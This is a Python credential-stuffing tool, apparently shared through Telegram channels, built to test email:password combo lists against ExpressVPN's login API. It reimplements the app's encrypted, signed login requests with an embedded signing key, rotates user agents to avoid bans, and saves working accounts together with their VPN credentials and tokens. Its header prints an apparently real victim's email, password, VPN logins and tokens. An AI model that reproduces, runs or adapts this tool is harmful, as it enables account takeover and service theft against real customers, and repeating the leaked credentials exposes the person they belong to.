"""
Murphy NETWORK 

Murphy :- @Mehydo & 

Main Channel: https://t.me/sadikmahedi88
Official Channel: https://t.me/+nFZYIGGrfgVkODIx
Group Chat: https://t.me/+Au7NgQAPKhVlN2Fh
Vouch Channel: https://t.me/+UD-Hh92xOcJlZGUx
Backup Channel: https://t.me/+ho4AlB5QKRhhYTk5

GitHub: https://GitHub.com/sadikmahedi88

اتَّقِ اللهَ فَتَقْوى اللهِ ما جاوَرَتْ قَلْبَ امْرِئٍ إلّا وَصَلَ
"""

"""
capture:
📧 Email : seobayar@gmail.com
🔑 Password : Widessta12@dodo
🆔 Account ID : 109917721
🆔 Subscription ID : 119702105
📦 Plan : full
🔄 Billing Cycle : Monthly (1 months)
💳 Payment Method : CB_CREDITCARD
📅 Expiration : 2026-12-08 (17 days)
🔁 Auto Bill : True
🔄 Can Renew : False
🛡️ License Status : ACTIVE
📋 Account Status : ACTIVE
🚫 Fraud : False
✅ Satisfied : True
🔑 OpenVPN User : iwnpv5bvga7t1pbf8bj3u8t4
🔒 OpenVPN Pass : fe6uqri1te7plefb78lgjqvx
🔑 PPTP User : d4lq5p
🔒 PPTP Pass : cf4qm2fd
🎫 Access Token : eyJ0b2tlbiI6ImFjY2VzcyIsInVpZC
🔄 Refresh Token : RAKS9AUAWKUA6MS8WQQN
📱 Combo Format : seobayar@gmail.com:Widessta12@dodo
"""


import base64, gzip, json, random, string, requests, hashlib, hmac, datetime, threading, re, os, time, sys, uuid
from io import BytesIO
from Crypto.Cipher import AES, PKCS1_v1_5, DES3
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from asn1crypto import cms, x509, keys
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
#from cfonts import render
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.align import Align
    from rich.text import Text
    from rich.box import ROUNDED, HEAVY, DOUBLE, MINIMAL
    from rich.rule import Rule
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("⚠ Please install rich: pip install rich")
    sys.exit(1)
init(autoreset=True)
console = Console()
AUTHOR = "by t.me/mehydo"
VERSION = "v1.0"
TOOL_NAME = "ExpressVPN Checker"
class colors:
    PRIMARY   = "cyan"
    SECONDARY = "magenta"
    SUCCESS   = "bright_green"
    ERROR     = "bright_red"
    WARNING   = "bright_yellow"
    INFO      = "bright_blue"
    DIM       = "grey50"
    GOLD      = "gold1"
    PINK      = "hot_pink"
    PURPLE    = "medium_purple1"
#BANNER = render('VPN Express', colors=['white', 'red'], align='center')
BANNER = 'B'
class AntiBanSystem:
    def __init__(self):
        self.user_agents = [
            "xvclient/v21.21.0 (ios; 16.4) ui/11.5.2",
            "xvclient/v21.20.0 (android; 13) ui/11.5.1",
            "xvclient/v21.22.0 (ios; 17.1) ui/11.5.3",
            "xvclient/v21.23.0 (android; 14) ui/11.6.0",
        ]
        self.os_versions = ["16.4", "13", "17.1", "14"]
        self.client_versions = ["11.5.2", "11.5.1", "11.5.3", "11.6.0"]
        self.max_retries = 2
        self.retry_delay = 3
        self.rotation_lock = threading.Lock()
        self.current_index = 0

    def get_random_headers(self):
        with self.rotation_lock:
            self.current_index = (self.current_index + 1) % len(self.user_agents)
            return (self.user_agents[self.current_index],
                    self.os_versions[self.current_index],
                    self.client_versions[self.current_index])


anti_ban = AntiBanSystem()
h_ky = b"@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
crt_b = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
crt = x509.Certificate.load(base64.b64decode(crt_b))
pb_k = crt.public_key.parsed if hasattr(crt.public_key, 'parsed') else keys.RSAPublicKey.load(crt.public_key['public_key'].parsed.dump())
rsa = RSA.construct((pb_k['modulus'].native, pb_k['public_exponent'].native))
stats = {
    'total': 0, 'good': 0, 'bad': 0, 'errors': 0,
    'checked': 0, 'active_working': 0, 'banned': 0, 'start_time': 0
}
stats_lock = threading.Lock()
print_lock = threading.Lock()
rich_lock = threading.Lock()
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
def get_timestamp():
    return datetime.datetime.now().strftime("%H:%M:%S")
def generate_fingerprint():
    return ''.join(random.choices(string.hexdigits.lower(), k=64)), str(uuid.uuid4())
def show_banner():
    text = Text()
    text.append(BANNER, style=f"bold {colors.PRIMARY}")
    console.print(Align.center(text))
    console.print(Align.center(
        Text(f"⚡ {TOOL_NAME}  •  {VERSION}  •  by {AUTHOR}",
             style=f"bold {colors.GOLD}")
    ))
    console.print(Align.center(
        Text(f"🕒 {get_timestamp()}", style=colors.DIM)
    ))
    console.print()
def menu_panel():
    table = Table.grid(padding=(0, 2))
    table.add_column(justify="center", style=colors.SECONDARY, no_wrap=True)
    table.add_column(style="white")
    table.add_row("[1]", "📂  Check combo file  [dim](enter path)[/]")
    table.add_row("[2]", "✍️   Manual check")
    table.add_row("[3]", f"🏆  Show active ({stats['active_working']})")
    table.add_row("[4]", "🔄  Reset stats")
    table.add_row("[00]", "🚪  Exit")
    panel = Panel(
        Align.center(table),
        title=f"[bold {colors.PRIMARY}]MAIN MENU[/]",
        subtitle=f"[{colors.DIM}]Select an option below[/]",
        border_style=colors.PRIMARY,
        box=DOUBLE,
        padding=(1, 4),
    )
    console.print(panel)
def stats_bar():
    table = Table.grid(padding=(0, 3))
    table.add_column(justify="center")
    table.add_column(justify="center")
    table.add_column(justify="center")
    table.add_column(justify="center")
    table.add_row(
        f"[{colors.SUCCESS}]✅ Active: {stats['active_working']}[/]",
        f"[{colors.ERROR}]🚫 Banned: {stats['banned']}[/]",
        f"[{colors.GOLD}]📊 Hits: {stats['good']}[/]",
        f"[{colors.INFO}]🔍 Checked: {stats['checked']}/{stats['total']}[/]",
    )
    console.print(Panel(table, border_style=colors.DIM, box=MINIMAL))
def print_hit_panel(data: dict):
    table = Table(
        show_header=False,
        box=ROUNDED,
        border_style=colors.SUCCESS,
        title=f"[bold {colors.SUCCESS}]✅ ACTIVE HIT #{data['hit_num']}[/]",
        title_align="left",
        expand=False,
        padding=(0, 2),
    )
    table.add_column(style=f"bold {colors.GOLD}", no_wrap=True)
    table.add_column(style="white")
    table.add_row("📧 Email",       data['email'])
    table.add_row("🔑 Password",    data['password'])
    table.add_row("🆔 Account ID",  str(data['account_id']))
    table.add_row("🆔 Sub ID",      str(data['sub_id']))
    table.add_row("📦 Plan",        data['plan'])
    table.add_row("🔄 Billing",     f"{data['billing']} ({data['billing_cycle']}m)")
    table.add_row("💳 Payment",     data['payment'])
    table.add_row("📅 Expire",      data['expiry_display'])
    table.add_row("🔁 Auto Bill",   str(data['auto_bill']))
    table.add_row("🔄 Can Renew",   str(data['can_renew']))
    table.add_row("🛡️ License",     data['license_status'])
    table.add_row("📋 Status",      data['status'])
    table.add_row("🚫 Fraud",       str(data['is_fraud']))
    table.add_row("✅ Satisfied",   str(data['is_satisfied']))
    table.add_row("🔑 OpenVPN",     f"{data['ovpn_user']}:{data['ovpn_pass']}")
    table.add_row("🔑 PPTP",        f"{data['pptp_user']}:{data['pptp_pass']}")
    with rich_lock:
        console.print()
        console.print(table)
        console.print()
def print_banned_line(hit_num, email, password):
    with rich_lock:
        console.print(
            f"  [{colors.ERROR}]🚫 BANNED #{hit_num}[/] "
            f"[white]{email}:{password}[/] "
            f"[{colors.ERROR}]License: REVOKED[/]"
        )
def print_unknown_line(hit_num, email, password, license_status):
    with rich_lock:
        console.print(
            f"  [{colors.WARNING}]⚠️  UNKNOWN #{hit_num}[/] "
            f"[white]{email}:{password}[/] "
            f"[{colors.WARNING}]License: {license_status}[/]"
        )
def print_bad_progress(email):
    with rich_lock:
        console.print(
            f"  [{colors.DIM}]✗ [{stats['checked']}/{stats['total']}] {email[:40]}[/]",
            end="\r",
        )
def save_full_account(email, password, plan, billing, payment, expiry, license_status,
                      status, ovpn_user, ovpn_pass, pptp_user, pptp_pass, token,
                      refresh_token, account_id, sub_id, billing_cycle, auto_bill,
                      can_renew, is_fraud, is_satisfied):
    with open("full_accounts.txt", "a", encoding="utf-8", errors="ignore") as f:
        f.write(f"""
📧 Email : {email}
🔑 Password : {password}
🆔 Account ID : {account_id}
🆔 Subscription ID : {sub_id}
📦 Plan : {plan}
🔄 Billing Cycle : {billing} ({billing_cycle} months)
💳 Payment Method : {payment}
📅 Expiration : {expiry}
🔁 Auto Bill : {auto_bill}
🔄 Can Renew : {can_renew}
🛡️ License Status : {license_status}
📋 Account Status : {status}
🚫 Fraud : {is_fraud}
✅ Satisfied : {is_satisfied}
🔑 OpenVPN User : {ovpn_user}
🔒 OpenVPN Pass : {ovpn_pass}
🔑 PPTP User : {pptp_user}
🔒 PPTP Pass : {pptp_pass}
🎫 Access Token : {token}
🔄 Refresh Token : {refresh_token}
📱 Combo Format : {email}:{password
Dev : t.me/sadikmahedi88}\n""")
def check_account(email, password):
    try:
        time.sleep(random.uniform(0.2, 0.8))
        iid, device_id = generate_fingerprint()
        iv, ky = get_random_bytes(16), get_random_bytes(16)
        ua, os_ver, client_ver = anti_ban.get_random_headers()

        jsn = json.dumps({
            "email": email, "iv": base64.b64encode(iv).decode('ascii'),
            "key": base64.b64encode(ky).decode('ascii'), "password": password,
            "device_id": device_id, "platform": "ios", "os_version": os_ver
        })
        buf = BytesIO()
        with gzip.GzipFile(fileobj=buf, mode='wb') as gz:
            gz.write(jsn.encode('utf-8'))
        gz_d = buf.getvalue()
        cky, civ = get_random_bytes(24), get_random_bytes(8)
        pad = gz_d + bytes([8 - (len(gz_d) % 8)] * (8 - (len(gz_d) % 8)))
        e_ct = DES3.new(cky, DES3.MODE_CBC, civ).encrypt(pad)
        e_ky = PKCS1_v1_5.new(rsa).encrypt(cky)
        enc = cms.ContentInfo({
            'content_type': '1.2.840.113549.1.7.3',
            'content': cms.EnvelopedData({
                'version': 0,
                'recipient_infos': [cms.RecipientInfo(name='ktri', value=cms.KeyTransRecipientInfo({
                    'version': 0,
                    'rid': cms.RecipientIdentifier(name='issuer_and_serial_number', value=cms.IssuerAndSerialNumber({
                        'issuer': crt.issuer, 'serial_number': crt.serial_number
                    })),
                    'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({'algorithm': '1.2.840.113549.1.1.1'}),
                    'encrypted_key': cms.OctetString(e_ky)
                }))],
                'encrypted_content_info': cms.EncryptedContentInfo({
                    'content_type': '1.2.840.113549.1.7.1',
                    'content_encryption_algorithm': cms.EncryptionAlgorithm({
                        'algorithm': '1.2.840.113549.3.7', 'parameters': cms.OctetString(civ)
                    }),
                    'encrypted_content': e_ct
                })
            })
        }).dump()

        path = f"/apis/v2/credentials?client_version={client_ver}&installation_id={iid}&os_name=ios&os_version={os_ver}"
        s_h = base64.b64encode(hmac.new(h_ky, f"POST {path}".encode('ascii'), hashlib.sha1).digest()).decode('ascii')
        s_b = base64.b64encode(hmac.new(h_ky, enc, hashlib.sha1).digest()).decode('ascii')

        headers = {
            "User-Agent": ua, "Content-Type": "application/octet-stream",
            "X-Body-Compression": "gzip", "Accept": "*/*",
            "X-Signature": f"2 {s_h} 91c776e", "X-Body-Signature": f"2 {s_b} 91c776e",
            "X-Device-ID": device_id, "X-Request-ID": str(uuid.uuid4())
        }

        response = requests.post(f"https://www.expressapisv2.net{path}", data=enc, headers=headers, timeout=20)
        dec = AES.new(ky, AES.MODE_CBC, iv).decrypt(response.content)
        res_d = json.loads(dec[:-dec[-1]].decode('utf-8'))

        if 'access_token' in res_d:
            token = res_d['access_token']
            refresh_token = res_d.get('refresh_token', 'N/A')
            ovpn_user = res_d.get('ovpn_username', 'N/A')
            ovpn_pass = res_d.get('ovpn_password', 'N/A')
            pptp_user = res_d.get('pptp_username', 'N/A')
            pptp_pass = res_d.get('pptp_password', 'N/A')
            account_id = res_d.get('id', 'N/A')

            sub_path = f"/apis/v2/subscription?access_token={token}&client_version={client_ver}&installation_id={iid}&os_name=ios&os_version={os_ver}&reason=activation_with_email"
            s_s = base64.b64encode(hmac.new(h_ky, f"GET {sub_path}".encode('ascii'), hashlib.sha1).digest()).decode('ascii')
            sub_res = requests.get(
                f"https://www.expressapisv2.net{sub_path}",
                headers={"User-Agent": ua, "X-Signature": f"2 {s_s} 91c776e"},
                timeout=20
            ).json()
            sub_data = sub_res.get('subscription', {})
            license_status = sub_data.get('license_status', 'UNKNOWN')
            status = sub_data.get('status', 'UNKNOWN')
            plan = sub_data.get('plan_type', 'Unknown')
            payment = sub_data.get('payment_method', 'N/A')
            billing_cycle = sub_data.get('billing_cycle', 1)
            sub_id = sub_data.get('id', 'N/A')
            auto_bill = sub_data.get('auto_bill', False)
            can_renew = sub_data.get('can_renew', False)
            is_fraud = sub_data.get('is_fraud', False)
            is_satisfied = sub_data.get('is_satisfied', False)
            billing_map = {1: 'Monthly', 12: 'Yearly', 6: '6 Months', 3: '3 Months', 24: '2 Years'}
            billing = billing_map.get(billing_cycle, str(billing_cycle))
            expiry_timestamp = sub_data.get('expiration_time', 0)
            if expiry_timestamp:
                expiry_date = datetime.datetime.fromtimestamp(expiry_timestamp)
                expiry_str = expiry_date.strftime('%Y-%m-%d')
                today = datetime.datetime.now()
                if expiry_date > today:
                    days_left = (expiry_date - today).days
                    expiry_display = f"{expiry_str} ({days_left} days)"
                else:
                    days_ago = (today - expiry_date).days
                    expiry_display = f"{expiry_str} (Expired {days_ago}d ago)"
            else:
                expiry_display = 'N/A'
            if license_status == 'ACTIVE':
                with stats_lock:
                    stats['good'] += 1
                    stats['checked'] += 1
                    stats['active_working'] += 1
                    hit_num = stats['good']

                save_full_account(email, password, plan, billing, payment, expiry_display,
                                  license_status, status, ovpn_user, ovpn_pass, pptp_user,
                                  pptp_pass, token[:30], refresh_token, account_id, sub_id,
                                  billing_cycle, auto_bill, can_renew, is_fraud, is_satisfied)

                with open("active_hits.txt", "a", encoding="utf-8", errors="ignore") as f:
                    f.write(f'{email}:{password} | Plan: {plan} | Expire: {expiry_display}\n')

                with open("active_full.txt", "a", encoding="utf-8", errors="ignore") as f:
                    f.write(f'{email}:{password} | {ovpn_user}:{ovpn_pass}\n')

                print_hit_panel({
                    'hit_num': hit_num, 'email': email, 'password': password,
                    'account_id': account_id, 'sub_id': sub_id, 'plan': plan,
                    'billing': billing, 'billing_cycle': billing_cycle, 'payment': payment,
                    'expiry_display': expiry_display, 'auto_bill': auto_bill,
                    'can_renew': can_renew, 'license_status': license_status,
                    'status': status, 'is_fraud': is_fraud, 'is_satisfied': is_satisfied,
                    'ovpn_user': ovpn_user, 'ovpn_pass': ovpn_pass,
                    'pptp_user': pptp_user, 'pptp_pass': pptp_pass,
                })
                return True
            elif license_status == 'REVOKED':
                with stats_lock:
                    stats['good'] += 1
                    stats['checked'] += 1
                    stats['banned'] += 1
                    hit_num = stats['good']
                print_banned_line(hit_num, email, password)
                return True
            else:
                with stats_lock:
                    stats['good'] += 1
                    stats['checked'] += 1
                    hit_num = stats['good']
                print_unknown_line(hit_num, email, password, license_status)
                return True
        else:
            with stats_lock:
                stats['bad'] += 1
                stats['checked'] += 1
            print_bad_progress(email)
            return False
    except Exception:
        with stats_lock:
            stats['errors'] += 1
            stats['checked'] += 1
        return False
def read_accounts_from_file(filename):
    accounts = []
    filename = filename.strip().strip('"').strip("'")

    if not os.path.exists(filename):
        console.print(Panel(
            f"[{colors.ERROR}]⚠ File not found:[/] [white]{filename}[/]\n"
            f"[{colors.DIM}]Please verify the path and try again.[/]",
            border_style=colors.ERROR,
            title="[bold red]❌ ERROR[/]",
            padding=(1, 2),
        ))
        return accounts

    if not os.path.isfile(filename):
        console.print(Panel(
            f"[{colors.ERROR}]⚠ Path is not a file:[/] [white]{filename}[/]",
            border_style=colors.ERROR,
            title="[bold red]❌ ERROR[/]",
        ))
        return accounts

    try:
        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    email, password = line.split(':', 1)
                    email = re.sub(r'[^\w\.@-]', '', email)
                    password = re.sub(r'[^\x20-\x7E]', '', password)
                    if '@' in email and password:
                        accounts.append((email, password))
    except Exception as e:
        console.print(Panel(
            f"[{colors.ERROR}]⚠ Failed to read file:[/] [white]{e}[/]",
            border_style=colors.ERROR,
            title="[bold red]❌ ERROR[/]",
        ))

    return accounts
def check_accounts_from_file():
    console.print(Rule(
        f"[bold {colors.PRIMARY}]📂 COMBO FILE SELECTION[/]",
        style=colors.PRIMARY,
    ))
    console.print()
    console.print(f"  [{colors.INFO}]💡 Enter the full path to your combo file[/]")
    console.print(f"  [{colors.DIM}]   Examples:[/]")
    console.print(f"  [{colors.DIM}]   • combo.txt[/]")
    console.print(f"  [{colors.DIM}]   • C:\\Users\\User\\Desktop\\combo.txt[/]")
    console.print(f"  [{colors.DIM}]   • /home/user/combos/list.txt[/]")
    console.print()
    file_path = console.input(
        f"  [{colors.WARNING}]➤ File path[/] "
        f"[{colors.DIM}](or 'back' to cancel)[/]: "
    ).strip()
    if file_path.lower() in ('back', 'exit', 'cancel', ''):
        console.print(f"  [{colors.DIM}]↩ Cancelled.[/]")
        time.sleep(0.6)
        return
    accounts = read_accounts_from_file(file_path)
    if not accounts:
        console.print(Panel(
            f"[{colors.ERROR}]❌ No valid accounts found in the file![/]\n"
            f"[{colors.DIM}]Make sure the file exists and contains lines in format:[/]\n"
            f"[white]   email@example.com:password[/]",
            border_style=colors.ERROR,
            title="[bold red]EMPTY OR INVALID[/]",
            padding=(1, 2),
        ))
        console.input(f"\n  [{colors.DIM}]Press Enter...[/]")
        return

    file_size = os.path.getsize(file_path)
    size_str = (
        f"{file_size / 1024:.1f} KB" if file_size < 1024 * 1024
        else f"{file_size / (1024 * 1024):.2f} MB"
    )
    info_table = Table(
        title=f"[bold {colors.SUCCESS}]✅ FILE LOADED[/]",
        box=ROUNDED,
        border_style=colors.SUCCESS,
        show_header=False,
        padding=(0, 2),
    )
    info_table.add_column(style=f"bold {colors.GOLD}", justify="right")
    info_table.add_column(style="white")
    info_table.add_row("📁 Path",  file_path)
    info_table.add_row("📊 Size",  size_str)
    info_table.add_row("🎯 Valid", f"[{colors.SUCCESS}]{len(accounts)}[/] accounts")
    console.print()
    console.print(info_table)
    console.print()
    threads_input = console.input(
        f"  [{colors.INFO}]➤ Threads (1-20) [Recommended: 10]: [/]"
    ).strip()
    threads = int(threads_input) if threads_input.isdigit() else 10
    threads = max(1, min(20, threads))
    console.print()
    console.print(Rule(
        f"[bold {colors.SUCCESS}]🚀 STARTING SCAN[/]",
        style=colors.SUCCESS,
    ))
    console.print(f"  [{colors.INFO}]💾 Output:[/] "
                  f"[white]active_hits.txt | active_full.txt | full_accounts.txt[/]")
    console.print(f"  [{colors.SUCCESS}]⚡ Running with {threads} threads...[/]\n")
    with stats_lock:
        stats['total'] = len(accounts)
        stats['start_time'] = time.time()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(check_account, email, password)
            for email, password in accounts
        ]
        for i, future in enumerate(as_completed(futures)):
            try:
                future.result(timeout=30)
            except Exception:
                pass

            if i % 25 == 0:
                with stats_lock:
                    elapsed = int(time.time() - stats['start_time'])
                    cpm = int((stats['checked'] / elapsed) * 60) if elapsed > 0 else 0
                    snapshot = dict(stats)
                with rich_lock:
                    console.print(
                        f"  [{colors.DIM}]📊 {snapshot['checked']}/{snapshot['total']} | "
                        f"⚡ {cpm} CPM | "
                        f"[{colors.SUCCESS}]✅ {snapshot['active_working']}[/] | "
                        f"[{colors.ERROR}]🚫 {snapshot['banned']}[/][/]",
                        end="\r",
                    )
    elapsed = int(time.time() - stats['start_time'])
    console.print()

    summary = Table(
        title=f"[bold {colors.GOLD}]✅ FINISHED in {elapsed // 3600}h {(elapsed % 3600) // 60}m {elapsed % 60}s[/]",
        box=DOUBLE,
        border_style=colors.GOLD,
        show_header=False,
        expand=False,
        padding=(0, 2),
    )
    summary.add_column(style="bold", justify="right")
    summary.add_column(justify="left")
    summary.add_row(f"[{colors.SUCCESS}]✅ Active[/]", f"[white]{stats['active_working']}[/]")
    summary.add_row(f"[{colors.ERROR}]🚫 Banned[/]",     f"[white]{stats['banned']}[/]")
    summary.add_row(f"[{colors.GOLD}]📊 Total Hits[/]",  f"[white]{stats['good']}[/]")
    summary.add_row(f"[{colors.WARNING}]⚠️  Errors[/]",   f"[white]{stats['errors']}[/]")
    console.print(summary)
    console.print()
def manual_check():
    console.print(Panel(
        f"[{colors.WARNING}]📝 Manual Mode - Format: [white]email:password[/]\n"
        f"[{colors.DIM}]Type [white]exit[/] to return[/]",
        border_style=colors.WARNING,
        title="MANUAL CHECK",
    ))
    while True:
        entry = console.input(f"  [{colors.WARNING}]➤ [/]").strip()
        if entry.lower() == 'exit':
            break
        if ':' in entry:
            email, password = entry.split(':', 1)
            if '@' in email and password:
                with stats_lock:
                    stats['total'] += 1
                check_account(email, password)
def show_active():
    try:
        with open("active_hits.txt", "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
        if lines:
            table = Table(
                title=f"[bold {colors.SUCCESS}]✅ ACTIVE ACCOUNTS ({len(lines)})[/]",
                box=ROUNDED,
                border_style=colors.SUCCESS,
                show_header=True,
                header_style=f"bold {colors.GOLD}",
            )
            table.add_column("#", style=colors.DIM, justify="right")
            table.add_column("Account", style="white")

            for i, line in enumerate(lines[-50:], 1):
                table.add_row(str(i), line.strip())
            console.print(table)
        else:
            console.print(f"  [{colors.WARNING}]⚠ No active accounts yet![/]")
    except Exception:
        console.print(f"  [{colors.WARNING}]⚠ No active accounts![/]")
def main():
    while True:
        clear_screen()
        show_banner()
        menu_panel()
        stats_bar()
        choice = console.input(
            f"\n  [{colors.WARNING}]➤ Select: [/]"
        ).strip()

        if choice == '1':
            check_accounts_from_file()
            console.input(f"\n  [{colors.DIM}]Press Enter...[/]")
        elif choice == '2':
            manual_check()
        elif choice == '3':
            show_active()
            console.input(f"\n  [{colors.DIM}]Press Enter...[/]")
        elif choice == '4':
            with stats_lock:
                for k in stats:
                    stats[k] = 0
            console.print(f"\n  [{colors.SUCCESS}]✅ Stats Reset![/]")
            time.sleep(1)
        elif choice == '00':
            console.print(f"\n  [{colors.DIM}]👋 Goodbye![/]\n")
            break
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print(f"\n\n  [{colors.WARNING}]🛑 Stopped by user[/]")